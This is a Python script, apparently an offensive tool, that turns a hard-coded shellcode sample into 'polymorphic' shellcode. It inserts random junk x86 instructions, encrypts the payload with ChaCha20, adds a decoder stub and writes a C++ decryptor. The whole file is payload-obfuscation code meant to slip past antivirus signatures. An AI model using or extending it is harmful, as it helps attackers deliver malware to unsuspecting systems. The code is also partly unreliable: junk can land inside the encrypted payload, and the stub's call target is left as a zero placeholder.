import random
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes

JUNK_INSTRUCTIONS = [
    [0x90],                      # nop
    [0x51, 0x59],                # push ecx; pop ecx
    [0x52, 0x5A],                # push edx; pop edx
    [0x53, 0x5B],                # push ebx; pop ebx
    [0x89, 0xf6],                # mov esi, esi
    [0x31, 0xc0],                # xor eax, eax
]

def insert_junk_instructions(stub: list[int], count: int = 3) -> list[int]:
    for _ in range(count):
        junk = random.choice(JUNK_INSTRUCTIONS)
        pos = random.randint(0, len(stub))
        stub = stub[:pos] + junk + stub[pos:]
    return stub

def junk_addition_via_negation():
    return insert_junk_instructions([0x8b, 0xc3, 0xf7, 0xd1, 0x29, 0xc1])

def junk_addition_double_negation():
    return insert_junk_instructions([0x8b, 0xd8, 0xf7, 0xd3, 0xf7, 0xd1, 0x01, 0xcb, 0xf7, 0xdb])

def junk_xor_substitution():
    return insert_junk_instructions([0x33, 0xc0, 0xf7, 0xd0, 0x23, 0xd8, 0xf7, 0xd3, 0x23, 0xc3, 0x09, 0xd8])

def junk_rand_add_chain():
    r = random.randint(1, 255)
    return insert_junk_instructions([0xb8, r, 0x00, 0x00, 0x00, 0x8b, 0xd8, 0x03, 0xc3, 0x03, 0xc1, 0x2b, 0xc3])

def junk_math_sub():
    return insert_junk_instructions([0x89, 0xC8, 0xF7, 0xD8, 0x01, 0xD8])

def junk_xor():
    return insert_junk_instructions([0x89, 0xC8, 0x21, 0xD0, 0x89, 0xD9, 0x31, 0xD3, 0x09, 0xD8])

def build_junk_math_block() -> list[int]:
    blocks = [junk_addition_via_negation, junk_addition_double_negation, junk_xor_substitution, junk_rand_add_chain, junk_math_sub, junk_xor]
    selected_blocks = random.sample(blocks, k=random.randint(2, 4))
    result = []
    for block in selected_blocks:
        result += block()
    return result

def chacha20_chiffre(shellcode: bytes):
    key = get_random_bytes(32)
    nonce = get_random_bytes(8)
    cipher = ChaCha20.new(key=key, nonce=nonce)
    encrypted = cipher.encrypt(shellcode)
    return encrypted, key, nonce

def generate_decoder_stub_with_cpp_call(shell_len: int, shellcode_ptr: int, key_ptr: int, nonce_ptr: int, chacha20_func_addr: int, shellcode_jmp_ptr: int) -> list[int]:
    stub = [
        0x68, *shell_len.to_bytes(4, 'little'),           # push shell_len
        0x68, *shellcode_ptr.to_bytes(4, 'little'),       # push shellcode_ptr
        0x68, *key_ptr.to_bytes(4, 'little'),             # push key_ptr
        0x68, *nonce_ptr.to_bytes(4, 'little'),           # push nonce_ptr
        0xE8, 0x00, 0x00, 0x00, 0x00,                     # call rel32 placeholder
        0xFF, 0x25, *shellcode_jmp_ptr.to_bytes(4, 'little'),  # jmp [shellcode_jmp_ptr]
    ]
    return stub

def bytes_to_cpp_array(name: str, b: bytes) -> str:
    array_str = ", ".join(f"0x{byte:02x}" for byte in b)
    return f"uint8_t {name}[] = {{ {array_str} }};"

def generate_cpp_code(shellcode_encrypted: bytes, key: bytes, nonce: bytes) -> str:
    shellcode_len = len(shellcode_encrypted)
    shellcode_array = bytes_to_cpp_array("shellcode_encrypted", shellcode_encrypted)
    key_array = bytes_to_cpp_array("key", key)
    nonce_array = bytes_to_cpp_array("nonce", nonce)

    cpp_code = f"""\
#include <iostream>
#include <cstdint>
#include <sodium.h>
using namespace std;
{shellcode_array}
const uint32_t shellcode_len = {shellcode_len};
{key_array}
{nonce_array}

extern "C" void chacha20_decode_cpp(uint8_t* shellcode, uint32_t length, const uint8_t* key, const uint8_t* nonce) {{
    crypto_stream_chacha20_xor(shellcode, shellcode, length, nonce, key);
}}

int main() {{
    if (sodium_init() < 0) {{
        cerr << "Erreur initialisation libsodium" << endl;
        return 1;
    }}

    cout << "[+] Shellcode chiffre avant dechiffrement:" << endl;
    for (uint32_t i = 0; i < shellcode_len; i++) {{
        printf("%02x ", shellcode_encrypted[i]);
    }}
    cout << endl;

    chacha20_decode_cpp(shellcode_encrypted, shellcode_len, key, nonce);

    cout << "[+] Shellcode dechiffre :" << endl;
    for (uint32_t i = 0; i < shellcode_len; i++) {{
        printf("%02x ", shellcode_encrypted[i]);
    }}
    cout << endl;

    return 0;
}}
"""
    return cpp_code

def generate_random_address(base=0x00400000, range_size=0x00100000):
    addr = random.randint(base, base + range_size - 1)
    return addr & ~0x3

def generate_polymorphic_shellcode(original_shellcode: bytes) -> tuple[list[int], bytes, bytes]:
    encrypted_shellcode, key, nonce = chacha20_chiffre(original_shellcode)

    shellcode_ptr = generate_random_address()
    key_ptr = generate_random_address()
    nonce_ptr = generate_random_address()
    chacha20_func_addr = generate_random_address()
    shellcode_jmp_ptr = generate_random_address()

    stub = generate_decoder_stub_with_cpp_call(
        len(original_shellcode),
        shellcode_ptr,
        key_ptr,
        nonce_ptr,
        chacha20_func_addr,
        shellcode_jmp_ptr
    )

    polymorphic_shellcode = stub + list(encrypted_shellcode)
    polymorphic_shellcode = insert_junk_instructions(polymorphic_shellcode, count=random.randint(3, 6))

    return polymorphic_shellcode, key, nonce

if __name__ == "__main__":

    original_shellcode = (
        b"\xdb\xc3\xd9\x74\x24\xf4\xbd\x69\x7c\xa7\x39\x5f\x2b"
        b"\xc9\xb1\x31\x31\x6f\x18\x03\x6f\x18\x83\xc7\x5b\x6b"
        b"\x44\x4b\x8b\xe9\xa7\xb4\x4b\x8e\x2e\x51\x7a\x8e\x55"
    )

    polymorphic_shellcode, key, nonce = generate_polymorphic_shellcode(original_shellcode)

    print("[+] Shellcode polymorphe (hex):")
    print(" ".join(f"{b:02x}" for b in polymorphic_shellcode))

    with open("polymorphic_shellcode.bin", "wb") as f:
        f.write(bytearray(polymorphic_shellcode))
    print("[+] Shellcode polymorphe écrit dans 'polymorphic_shellcode.bin'")

    with open("key.txt", "w") as f:
        f.write(key.hex())
    print("[+] Clé ChaCha20 écrite dans 'key.txt'")

    cpp_code = generate_cpp_code(bytes(polymorphic_shellcode[-len(original_shellcode):]), key, nonce)
    with open("decoder.cpp", "w") as f:
        f.write(cpp_code)
    print("[+] Code C++ de décodage écrit dans 'decoder.cpp'")
